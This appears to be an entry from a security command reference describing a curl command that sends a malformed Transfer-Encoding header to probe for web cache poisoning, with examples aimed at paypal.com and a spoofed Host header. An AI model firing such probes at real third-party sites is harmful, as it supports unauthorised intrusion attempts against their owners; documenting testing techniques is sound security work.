---
data: 'curl -H "Transfer-Encoding: chunked invalid" [URL]'
tags:
  - http
  - exploitation
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: eb87d0a0-300e-44c6-9d21-eb60a2ddb54f
created_at: '2025-12-11T06:10:40.117Z'
updated_at: '2025-12-11T06:10:40.117Z'
verified: false
validated: true
submitted: true
---
# curl-send-invalid-transfer-encoding

## Command

```bash
curl -H "Transfer-Encoding: chunked invalid" [URL]
```

## Description

This command uses curl to send an HTTP request with an invalid Transfer-Encoding header, useful for testing or exploiting web cache poisoning vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Transfer-Encoding: chunked invalid"` | Adds the invalid header | Yes |
| `[URL]` | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl -H "Transfer-Encoding: chunked invalid" https://www.paypal.com/
```

### Advanced Usage

```bash
curl -H "Transfer-Encoding: chunked invalid" -H "Host: www.paypalobjects.com" https://www.paypal.com/path/to/js/file
```

## Expected Output

Server response, potentially a 501 error if the header is not handled properly, indicating potential for cache poisoning.

## Related

- [[tools/curl]]
- [[procedures/Craft-and-Send-Poisoning-Request]]
